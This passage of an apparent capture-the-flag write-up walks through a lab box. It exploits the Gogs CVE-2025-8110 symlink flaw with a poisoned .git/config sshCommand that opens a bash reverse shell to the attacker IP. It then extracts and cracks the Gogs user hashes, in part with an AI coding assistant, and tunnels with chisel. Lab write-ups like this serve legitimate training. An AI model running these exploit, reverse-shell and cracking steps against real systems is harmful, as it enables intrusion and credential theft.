![image-20260910171249886](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910171249886.png)

There’s one that doesn’t, for vroth:

![image-20260910171339130](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910171339130.png)

That’s creds for vroth, “mOo03jpsqx8JQYMBwvFP”.

The Recycle Bin also has a single item, the “Domain Password Policy”:

![image-20260910210518471](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910210518471.png)

It looks empty, but under Advanced, there’s an attached file:

![image-20260910210542553](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910210542553.png)

This document is the GPO that defines the domain password policy:

![image-20260910210702753](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910210702753.png)

The most interesting part which will come in handy later is the password policy. From this I can see that `ghostlink.htb` has the following:

| Policy | Setting |
|---|---|
| Enforce password history | 24 passwords remembered |
| Maximum password age | 42 days |
| Minimum password age | 1 days |
| Minimum password length | 20 characters |
| Password must meet complexity requirements | Enabled |
| Store passwords using reversible encryption | Disabled |

#### Password Use

The password entry in KeePass doesn’t say where it is to be used. It doesn’t work on the domain in general:

```console
oxdf@hacky$ netexec smb ghostlink.htb -u vroth -p 'mOo03jpsqx8JQYMBwvFP'
SMB         10.129.83.229   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.83.229   445    DC01             [-] ghostlink.htb\vroth:mOo03jpsqx8JQYMBwvFP STATUS_LOGON_FAILURE
```

The password does work to login to Gogs:

![image-20260911070401991](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260911070401991.png)

This access provides activity timelines as vroth, but no new information or code from what I found above.

### CVE-2025-8110

#### Identifying CVE

Searching for “gogs 0.13.3 vulnerability” returns references to an RCE vulnerability:

![image-20260907192905455](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260907192905455.png)

NIST describes [CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110) as:

> Improper Symbolic link handling in the PutContents API in Gogs allows Local Execution of Code.

This vulnerability was [added to the CISA KEV catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-8110) on January 12, 2026, and fixed in Gogs 0.13.4, released eleven days after that. This host is still on 0.13.3.

This is also the same vulnerability I exploited in [HTB Silentium](https://0xdf.gitlab.io/2026/09/12/htb-silentium.html#cve-2025-8110) for root. I covered this vulnerability in depth in that post, and there’s this [post from Wiz](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit) that describes the vulnerability.

#### Strategy

To exploit this vulnerability, I need to create a repo in Gogs and put a symlink in that repo. Then I can write to that symlink over the API and it will write out of the repo on target.

In Silentium, Gogs was running as root and I had it write my public SSH key to `/root/.ssh/authorized_keys`. Here it’s a Windows machine, or a Linux VM, and I don’t know who Gogs is running as and don’t have SSH access. The Wiz writeup shows pointing the symlink at `.git/config` and then abusing `sshCommand`, which tells Git what commands to run when interacting over SSH. By changing that, I can get RCE.

#### Create Malicious Repo

I’ll start by creating a new repo in Gogs:

![image-20260911071941167](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260911071941167.png)

It doesn’t matter what I call it:

![image-20260911072024384](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260911072024384.png)

I’ll clone this to my host, adding the auth information to the URL:

```console
oxdf@hacky$ git clone http://vroth:mOo03jpsqx8JQYMBwvFP@gpz-op26-toolkits.ghostlink.htb/vroth/sploit.git
Cloning into 'sploit'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Unpacking objects: 100% (3/3), 222 bytes | 222.00 KiB/s, done.
```

In that repo, I’ll create a symlink to `.git`, the directory I want to write to:

```console
oxdf@hacky$ cd sploit/
oxdf@hacky$ ln -s .git gitdir
```

I’ll add and commit that file, and push it back to Gogs:

```console
oxdf@hacky$ git add gitdir
oxdf@hacky$ git commit -m "added exploit"
[master 4d60b1f] added exploit
 1 file changed, 1 insertion(+)
 create mode 120000 gitdir
oxdf@hacky$ git push
Enumerating objects: 6, done.
Counting objects: 100% (6/6), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (5/5), 462 bytes | 462.00 KiB/s, done.
Total 5 (delta 0), reused 0 (delta 0), pack-reused 0
To http://gpz-op26-toolkits.ghostlink.htb/vroth/sploit.git
   1778919..4d60b1f  master -> master
```

#### Write Poisoned config

I’ll need an API token from Gogs, which I can get in “Your Settings”:

![image-20260911072350969](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260911072350969.png)

There I can select Applications and see there are already two tokens. There’s no way to read old tokens, so I’ll click “Generate New Token” to make a new one. On giving it a name and clicking “Generate Token”, it gives it to me:

![image-20260911090140199](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260911090140199.png)

I’ll also need the contents that I want to write. The `.git/config` in this repo looks like:

```ini
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://vroth:mOo03jpsqx8JQYMBwvFP@gpz-op26-toolkits.ghostlink.htb/vroth/sploit.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
        remote = origin
        merge = refs/heads/master
```

I’ll want to add an `sshCommand` value, so my update will make a file like this:

```ini
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.15.169/443 0>&1' #
[remote "origin"]
        url = git@localhost:gogs/sploit.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
        remote = origin
        merge = refs/heads/master
```

I’m also changing the `url` so that the one I write uses SSH instead of HTTP to interact with Git. Without this change, it wouldn’t trigger the `sshCommand`. The `#` is required because of how Git appends the host and the remote command when it invokes the string. The `#` comments those out to just run my command.

The VM RDP port from the initial scan suggests VMs running on this host, so I’ll try both a Windows and a Linux reverse shell. It’s the Linux one that works. I’ll base64-encode that file:

```console
oxdf@hacky$ base64 -w0 gitconfig
W2NvcmVdCiAgICAgICAgcmVwb3NpdG9yeWZvcm1hdHZlcnNpb24gPSAwCiAgICAgICAgZmlsZW1vZGUgPSB0cnVlCiAgICAgICAgYmFyZSA9IGZhbHNlCiAgICAgICAgbG9nYWxscmVmdXBkYXRlcyA9IHRydWUKICAgICAgICBzc2hDb21tYW5kID0gYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNjkvNDQzIDA+JjEnICMKW3JlbW90ZSAib3JpZ2luIl0KICAgICAgICB1cmwgPSBnaXRAbG9jYWxob3N0OmdvZ3Mvc3Bsb2l0LmdpdAogICAgICAgIGZldGNoID0gK3JlZnMvaGVhZHMvKjpyZWZzL3JlbW90ZXMvb3JpZ2luLyoKW2JyYW5jaCAibWFzdGVyIl0KICAgICAgICByZW1vdGUgPSBvcmlnaW4KICAgICAgICBtZXJnZSA9IHJlZnMvaGVhZHMvbWFzdGVyCgo=
```

Now I’ll run `curl` with the following options to use the PUT API to write to that symlink, which should write to the `config` file in the `.git` directory:

- `-X PUT` - Use an HTTP PUT request.
- `-H 'Content-Type: application/json'` - Process the body as JSON
- `-H 'Authorization: token <token>'` - Auth via the personal access token (PAT) generated just above.
- `--data '{"message": "x", "content": "<base64 encoded content>"}'` - The content I want to write.
- `http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/sploit/contents/gitdir/config` - The path to write. It targets the `gitdir` symlink I just created and writes the `config` inside that directory.

I’ll run that:

```console
oxdf@hacky$ curl -X PUT http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/sploit/contents/gitdir/config --data '{"message": "x", "content": "W2NvcmVdCiAgICAgICAgcmVwb3NpdG9yeWZvcm1hdHZlcnNpb24gPSAwCiAgICAgICAgZmlsZW1vZGUgPSB0cnVlCiAgICAgICAgYmFyZSA9IGZhbHNlCiAgICAgICAgbG9nYWxscmVmdXBkYXRlcyA9IHRydWUKICAgICAgICBzc2hDb21tYW5kID0gYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNjkvNDQzIDA+JjEnICMKW3JlbW90ZSAib3JpZ2luIl0KICAgICAgICB1cmwgPSBnaXRAbG9jYWxob3N0OmdvZ3Mvc3Bsb2l0LmdpdAogICAgICAgIGZldGNoID0gK3JlZnMvaGVhZHMvKjpyZWZzL3JlbW90ZXMvb3JpZ2luLyoKW2JyYW5jaCAibWFzdGVyIl0KICAgICAgICByZW1vdGUgPSBvcmlnaW4KICAgICAgICBtZXJnZSA9IHJlZnMvaGVhZHMvbWFzdGVyCgo="}' -H 'Authorization: token 7fb5cd44daf35234069fe2dc70717f1e25d0edcc' -H 'Content-Type: application/json'
```

It hangs, but at my listening `nc`:

```console
oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.83.229 49796
bash: cannot set terminal process group (692): Inappropriate ioctl for device
bash: no job control in this shell
git@gpz-op26-toolkits:~/data/tmp/local-repo/7$
```

The prompt shows the current directory is where Gogs checks out the repo to a temporary working copy to service the API write, and the `gitdir` symlink resolves to that copy’s own `.git`. So the write landed in a live Git config, and when Gogs went to push the change back, Git read the `sshCommand` I’d just planted and ran it.

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
git@gpz-op26-toolkits:~/data/tmp/local-repo/7$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
git@gpz-op26-toolkits:~/data/tmp/local-repo/7$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@hacky$ stty raw -echo; fg
nc -lvnp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
git@gpz-op26-toolkits:~/data/tmp/local-repo/7$
```

## Auth as nvirelli on ghostlink.htb

### Enumeration

#### Users

There is one user with a home directory in `/home` (and the git user can’t access it):

```console
git@gpz-op26-toolkits:~$ ls /home/
nvirelli
```

nvirelli, git, and root all have shells configured in `passwd`:

```console
git@gpz-op26-toolkits:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
git:x:1000:1000::/opt/gogs:/bin/sh
nvirelli:x:1001:1001::/home/nvirelli:/bin/bash
```

`sudo` isn’t installed on the host.

#### VM

This is clearly not the Windows host that is the main host for this box. There is no `.dockerenv` file in the root of the filesystem, suggesting this isn’t a Docker container. `systemd-detect-virt` says it’s Microsoft, which also suggests a VM:

```console
git@gpz-op26-toolkits:/$ systemd-detect-virt
microsoft
```

I can also look at the `cgroup` and `comm` (the kernel’s short name for a process):

```console
git@gpz-op26-toolkits:/$ cat /proc/1/cgroup
0::/init.scope
git@gpz-op26-toolkits:/$ cat /proc/1/comm
systemd
```

It’s launching systemd, rather than a Docker-defined process.

The IP address is 172.16.20.20:

```console
git@gpz-op26-toolkits:/$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:32:7a:01 brd ff:ff:ff:ff:ff:ff
    altname enx00155d327a01
    inet 172.16.20.20/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fe32:7a01/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
```

This matches the address of `gpz-op26-toolkits.ghostlink.htb` from MQTT. The `00:15:5d` prefix on the MAC is Microsoft’s OUI for Hyper-V virtual adapters, which confirms the hypervisor.

#### Gogs

The git user’s home directory is `/opt/gogs`:

```console
git@gpz-op26-toolkits:~$ ls
custom  data  gogs  gogs-repositories  log
```

In `data`, there’s a `gogs.db` file:

```console
git@gpz-op26-toolkits:~$ ls data/
avatars  gogs.db  sessions  ssh  tmp
```

`file` isn’t on the box, but `custom/config/app.ini` shows it is using SQLite at that path:

```ini
BRAND_NAME = Gogs
RUN_USER   = git
RUN_MODE   = prod

[database]
TYPE     = sqlite3
HOST     = 127.0.0.1:5432
NAME     = gogs
SCHEMA   = public
USER     = gogs
PASSWORD =
SSL_MODE = disable
PATH     = data/gogs.db

[repository]
ROOT           = /opt/gogs/gogs-repositories
DEFAULT_BRANCH = master

[server]
DOMAIN           = gpz-op26-toolkits.ghostlink.htb
HTTP_PORT        = 3000
EXTERNAL_URL     = http://gpz-op26-toolkits.ghostlink.htb/
DISABLE_SSH      = false
SSH_PORT         = 22
START_SSH_SERVER = true
OFFLINE_MODE     = true

[email]
ENABLED = false

[auth]
REQUIRE_EMAIL_CONFIRMATION  = false
DISABLE_REGISTRATION        = true
ENABLE_REGISTRATION_CAPTCHA = false
REQUIRE_SIGNIN_VIEW         = false

[user]
ENABLE_EMAIL_NOTIFICATION = false

[picture]
DISABLE_GRAVATAR        = true
ENABLE_FEDERATED_AVATAR = false

[session]
PROVIDER = file

[log]
MODE      = file
LEVEL     = Info
ROOT_PATH = /opt/gogs/log

[security]
INSTALL_LOCK = true
SECRET_KEY   = Y7SF7En6vzf33gX
```

I’ll exfil the `gogs.db` back to my host and take a look:

```console
oxdf@hacky$ file gogs.db
gogs.db: SQLite 3.x database, last written using SQLite version 3046001, file counter 175, database pages 97, 1st free page 97, free pages 1, cookie 0x53, schema 4, UTF-8, version-valid-for 175
oxdf@hacky$ sqlite3 gogs.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
access                    label                     star
access_token              lfs_object                team
action                    login_source              team_repo
attachment                milestone                 team_user
collaboration             mirror                    two_factor
comment                   notice                    two_factor_recovery_code
deploy_key                org_user                  upload
email_address             protect_branch            user
follow                    protect_branch_whitelist  version
hook_task                 public_key                watch
issue                     pull_request              webhook
issue_label               release
issue_user                repository
```

The `user` table is most interesting. It has five users:

```console
sqlite> select * from user;
id|lower_name|name|full_name|email|passwd|login_source|login_name|type|location|website|rands|salt|created_unix|updated_unix|last_repo_visibility|max_repo_creation|is_active|is_admin|allow_git_hook|allow_import_local|prohibit_login|avatar|avatar_email|use_custom_avatar|num_followers|num_following|num_stars|num_repos|description|num_teams|num_members
1|vroth|vroth|Vesper Roth|vroth@ghostlink.htb|12528ba6418a9741578a33e0759b2e8375470269b720069ccab38f5c1cb3c287e4bf319ca7bd700d9d8a7395a4222e5ab326|0||0|||q1FMMmZjam|6y62BTJVSO|1772033630|1789160404|0|-1|1|0|0|0|0|a5dbf1452b232873be63dcd56dc4fb36|vroth@ghostlink.htb|0|0|0|0|3||0|0
2|nvirelli|nvirelli|Nyx Virelli|nvirelli@ghostlink.htb|8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8|0||0|||QRIHYJqJdc|DW3YdxPy25|1772559031|1773098337|0|-1|1|1|1|0|0|e93d36367c0edfc175238f92da595a5c|nvirelli@ghostlink.htb|0|0|0|0|0||0|0
3|gpz-tools-admin|gpz-tools-admin||null@ghostlink.htb|ec5a7a9fc3417846b7baef2d301e9a0beaecf200fd5f33aa235c72c2b0a206f582eab05332d6e6799c78a45387b2b7fe7014|0||0|||xyLoc9rSW2|CIRi441QwX|1772641885|1772641895|0|-1|1|1|0|0|0|ca278013a416c3660f37420455fc27a3|null@ghostlink.htb|0|0|0|0|0||0|0
4|zkovacs|zkovacs|Zara Kovacs|zkovacs@ghostlink.htb|a7dbbe7f55d2e4a66e8e7aa1f0fdd5cadddbc3fe4d06a060782e1b5985959461695ea9da089653099b221c0dc326caad01a2|0||0|||5z4cc2KOxM|qMOaBu0l1B|1772642434|1772644544|0|-1|1|0|0|0|0|da0fe0323e28d132295d822e86cca538|zkovacs@ghostlink.htb|0|0|0|0|2||0|0
5|ohexley|ohexley|Orin Hexley|ohexley@ghostlink.htb|6b286f89df176ae6405dc75cc436f0b6493ed2c29a0b6c1363c111b22b23075ebd790c4015e315ddb3d770c3f7caa97d6620|0||0|||jikxuVT92g|OEVEC4I5Io|1772642491|1772644060|0|-1|1|0|0|0|0|b7b8c700d7d9c364d14a80ee471941be|ohexley@ghostlink.htb|0|0|0|0|2||0|0
```

### Recover Password

#### Format Hash

The Gogs DB row in the `user` table has a password hash and salt for each user. I first walked through how to create a `hashcat` compatible hash in [HTB Health](https://0xdf.gitlab.io/2023/01/07/htb-health.html#crack-hash). Rather than doing it manually, I can do it with Claude:

```claude
 ▐▛███▛█   Claude Code v2.1.267
▝▜██████▀  Opus 4.8 · Claude Max
  ▝▝ ▝▝    ~/ghostlink

Fable 5.1 writes better code and reports progress on long tasks. Switch anytime with /model.

❯ there's a gogs.db file in this directory. can you give me hashcat compatible hashes from the user table?

● Opus 5 (1M context)'s safeguards flagged this message. Our intentionally broad safeguards allow us to deliver more capabilities faster, but can sometimes flag legitimate coding, cybersecurity, and biology tasks. Switched to Opus 4.8. Send feedback with /feedback or learn more

Details: `[cyber]`
  ⎿  Tip: You can configure model switch behavior in /config

● I'll examine the gogs.db file and pull out the user password data.

  Ran 2 shell commands (ctrl+o to expand)

● Gogs hashes passwords with PBKDF2-HMAC-SHA256 (10000 iterations, 50-byte output, salt used as raw ASCII bytes). That's hashcat mode 10900, whose format is sha256:iterations:base64(salt):base64(hash). Let me convert them.

  Ran 1 shell command (ctrl+o to expand)

● Done. Here are the 5 users from the user table in hashcat mode 10900 (PBKDF2-HMAC-SHA256) format — sha256:iterations:base64(salt):base64(hash):

vroth:sha256:10000:Nnk2MkJUSlZTTw==:ElKLpkGKl0FXijPgdZsug3VHAmm3IAacyrOPXByzwo fkvzGcp71wDZ2Kc5WkIi5asyY= nvirelli:sha256:10000:RFczWWR4UHkyNQ==:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq 4/9RAi8W5Bl/5V+cWN1p77BdV0+g= gpz-tools-admin:sha256:10000:Q0lSaTQ0MVF3WA==:7Fp6n8NBeEa3uu8tMB6aC+rs8gD9XzOq I1xywrCiBvWC6rBTMtbmeZx4pFOHsrf+cBQ= zkovacs:sha256:10000:cU1PYUJ1MGwxQg==:p9u+f1XS5KZujnqh8P3Vyt3bw/5NBqBgeC4bWYWV lGFpXqnaCJZTCZsiHA3DJsqtAaI= ohexley:sha256:10000:T0VWRUM0STVJbw==:ayhvid8XauZAXcdcxDbwtkk+0sKaC2wTY8ERsisj B169eQxAFeMV3bPXcMP3yql9ZiA=

Key facts: - Algorithm: Gogs uses pbkdf2(password, salt, 10000, 50, sha256), salt stored as a raw 10-char ASCII string, digest stored as 100 hex chars (50 bytes). - Hashcat mode: -m 10900. The hashes (without the username: prefix) are in scripts_claude/hashes.txt.

To crack, strip the usernames first, then run:

cut -d: -f2- scripts_claude/hashes.txt > hashes_only.txt hashcat -m 10900 hashes_only.txt /path/to/rockyou.txt

One caveat worth knowing: hashcat's 10900 truncates the digest it compares to 32 bytes, but since it's deriving from the same password/salt the comparison still holds, so cracking works normally.

✻ Cooked for 31s · done 3:23 PM
```

This seems to reliably trip the safeguards to route me down to Opus 4.8, but it still works great.

#### Crack Hashes

`--user` tells `hashcat` to expect the `username:` prefix on each line. It recognizes these are mode 10900 on its own, and cracks one of them within a few minutes:

```console
$ hashcat gogs.db.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF
...[snip]...
sha256:10000:RFczWWR4UHkyNQ==:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq4/9RAi8W5Bl/5V+cWN1p77BdV0+g=:u47YUclrDiwWxBheaSzI
...[snip]...
Started: Sat Sep 12 11:29:03 2026
Stopped: Sat Sep 12 11:38:17 2026
```

On my host cracking nvirelli’s hash takes about 3 minutes. The entire `rockyou.txt` completed on my host in just under 10 minutes. None of the others cracked in any reasonable amount of time. I do have the password policy from above, so I could try to filter out `rockyou.txt` to only passwords that meet that policy, but that would only apply to domain accounts.

#### Validate Password

This password works as a Linux account on the Gogs VM:

```console
git@gpz-op26-toolkits:~$ su nvirelli -
Password:
nvirelli@gpz-op26-toolkits:/opt/gogs$
```

Here I can grab `user.txt`:

```console
nvirelli@gpz-op26-toolkits:~$ cat user.txt
eca6e97f************************
```

It also works for auth on the domain:

```console
oxdf@hacky$ netexec smb DC01.ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI'
SMB         10.129.83.229   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.83.229   445    DC01             [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI
```

## Shell as Administrator@DC01

### Enumerate

#### SMB

The shares on the DC look like the standard DC shares:

```console
oxdf@hacky$ netexec smb DC01.ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --shares
SMB         10.129.83.229   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.83.229   445    DC01             [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI
SMB         10.129.83.229   445    DC01             [*] Enumerated shares
SMB         10.129.83.229   445    DC01             Share           Permissions            Remark
SMB         10.129.83.229   445    DC01             -----           -----------            ------
SMB         10.129.83.229   445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.83.229   445    DC01             C$                                     Default share
SMB         10.129.83.229   445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.83.229   445    DC01             NETLOGON        READ                   Logon server share
SMB         10.129.83.229   445    DC01             SYSVOL          READ                   Logon server share
```

It reports 11 users (though no need to go deep here, as I’ll collect BloodHound shortly):

```console
oxdf@hacky$ netexec smb DC01.ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --users
SMB         10.129.83.229   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.83.229   445    DC01             [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI
SMB         10.129.83.229   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.83.229   445    DC01             Administrator                 2026-04-10 04:34:52 0       Built-in account for administering the computer/domain
SMB         10.129.83.229   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.83.229   445    DC01             krbtgt                        2026-02-24 00:14:01 0       Key Distribution Center Service Account
SMB         10.129.83.229   445    DC01             nvirelli                      2026-03-03 20:35:06 0       Identity and federation specialist
SMB         10.129.83.229   445    DC01             kdraven                       2026-02-24 00:18:33 0       Defensive intelligence
SMB         10.129.83.229   445    DC01             zkovacs                       2026-02-24 00:18:34 0       Cryptography and signing workflows
SMB         10.129.83.229   445    DC01             ohexley                       2026-02-24 00:18:34 0       Binary analysis and reverse engineering
SMB         10.129.83.229   445    DC01             vroth                         2026-02-24 00:18:34 0       Automation and script development
SMB         10.129.83.229   445    DC01             dsoren                        2026-02-24 00:18:34 0       Digital forensics and incident response
SMB         10.129.83.229   445    DC01             lnoctis                       2026-02-24 00:18:34 0       Open source intelligence
SMB         10.129.83.229   445    DC01             svc_canary                    2026-02-24 14:37:09 0       Healthcheck Canary for Anika Jensen
SMB         10.129.83.229   445    DC01             [*] Enumerated 11 local users: GHOSTLINK
```

svc_canary’s description, “Healthcheck Canary for Anika Jensen”, confirms what that account is for. It’s the one running the healthcheck I poisoned over MQTT to get into the secure site.

#### LDAP

There’s a bunch of info I can pull over LDAP, but the best starting place is BloodHound. I’ll collect with [RustHound-CE](https://github.com/g0h4n/RustHound-CE):

```console
oxdf@hacky$ rusthound-ce -d ghostlink.htb -u nvirelli -p u47YUclrDiwWxBheaSzI --ldaps --zip
---------------------------------------------------
Initializing RustHound-CE at 01:55:43 on 09/12/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-12T01:55:43Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-12T01:55:43Z INFO  rusthound_ce] Collection method: All
[2026-09-12T01:55:43Z INFO  rusthound_ce::ldap] Connected to GHOSTLINK.HTB Active Directory!
[2026-09-12T01:55:43Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-09-12T01:55:43Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-12T01:55:44Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ghostlink,DC=htb
[2026-09-12T01:55:44Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-12T01:55:45Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=ghostlink,DC=htb
[2026-09-12T01:55:45Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-12T01:55:46Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=ghostlink,DC=htb
[2026-09-12T01:55:46Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-12T01:55:46Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=ghostlink,DC=htb
[2026-09-12T01:55:46Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-12T01:55:46Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=ghostlink,DC=htb
[2026-09-12T01:55:46Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-09-12T01:55:46Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
⢀ Parsing LDAP objects: 2%                                                                                            [2026-09-12T01:55:46Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2026-09-12T01:55:46Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-09-12T01:55:46Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 12 users parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 63 groups parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 2 computers parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-09-12T01:55:47Z INFO  rusthound_ce::json::maker::common] .//20260912015547_ghostlink-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 01:55:47 on 09/12/26! Happy Graphing!
```

I’ll upload to the CE Docker container, and mark nvirelli as owned. They don’t have any interesting outbound control:

![image-20260911141054189](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260911141054189.png)

Their only privileges come through being in `Domain Users`. The collection output above reports 11 enabled certificate templates and one enterprise CA, so there is ADCS on the domain.

#### Tunnel

`certipy` shows I can’t access the CA from my host directly, but it likely is accessible on the internal network. I’ll create a tunnel using [Chisel](https://github.com/jpillora/chisel):

```console
git@gpz-op26-toolkits:/dev/shm$ wget 10.10.15.169/chisel_1.11.8_linux_amd64
Prepended http:// to '10.10.15.169/chisel_1.11.8_linux_amd64'
--2026-09-11 20:47:53--  http://10.10.15.169/chisel_1.11.8_linux_amd64
Connecting to 10.10.15.169:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10571938 (10M) [application/octet-stream]
Saving to: ‘chisel_1.11.8_linux_amd64’

chisel_1.11.8_linux 100%[===================>]  10.08M  4.37MB/s    in 2.3s

2026-09-11 20:47:55 (4.37 MB/s) - ‘chisel_1.11.8_linux_amd64’ saved [10571938/10571938]

git@gpz-op26-toolkits:/dev/shm$ chmod +x chisel_1.11.8_linux_amd64
git@gpz-op26-toolkits:/dev/shm$ stty cols 222
git@gpz-op26-toolkits:/dev/shm$ ./chisel_1.11.8_linux_amd64 client 10.10.15.169:8000 R:socks
2026/09/11 20:49:10 client: Connecting to ws://10.10.15.169:8000
2026/09/11 20:49:10 client: Connected (Latency 20.9722ms)
```

When I run that it hangs, but at my listening server:

```console
oxdf@hacky$ /opt/chisel/chisel_1.11.8_linux_amd64 server --reverse --port 8000
2026/09/11 16:48:35 server: Reverse tunnelling enabled
